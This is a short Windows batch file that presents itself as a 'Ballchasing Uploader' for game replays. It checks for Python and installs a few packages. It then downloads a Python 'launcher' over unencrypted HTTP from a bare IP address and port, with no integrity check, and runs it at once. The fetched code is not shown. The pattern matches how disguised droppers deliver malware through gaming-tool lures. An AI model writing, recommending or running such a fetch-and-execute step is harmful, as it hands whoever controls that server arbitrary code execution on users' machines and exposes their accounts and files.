@echo off
setlocal
title Ballchasing Uploader

:: ── Python check ───────────────────────────────────────────────────────────────
python --version >nul 2>&1
if errorlevel 1 (
    echo.
    echo  Python not found.
    echo  Install from https://www.python.org/downloads/
    echo  Make sure "Add Python to PATH" is checked during install.
    echo.
    pause
    exit /b
)

:: ── Python dependencies ────────────────────────────────────────────────────────
if not exist "%~dp0src\lib\" (
    echo Installing dependencies...
    pip install requests customtkinter pillow -q --target "%~dp0src\lib"
    if errorlevel 1 (
        echo Failed to install dependencies.
        pause
        exit /b
    )
    echo Done.
)

:: ── Download launcher from server ─────────────────────────────────────────────
if not exist "%~dp0launcher.py" (
    echo Downloading launcher...
    powershell -NoProfile -Command ^
        "try { Invoke-WebRequest 'http://46.101.184.78:8766/launcher' -OutFile '%~dp0launcher.py' -UseBasicParsing } catch { exit 1 }"
    if not exist "%~dp0launcher.py" (
        echo Failed to download launcher. Check your internet connection.
        pause
        exit /b
    )
    echo Done.
)

:: ── Launch ─────────────────────────────────────────────────────────────────────
python "%~dp0launcher.py"
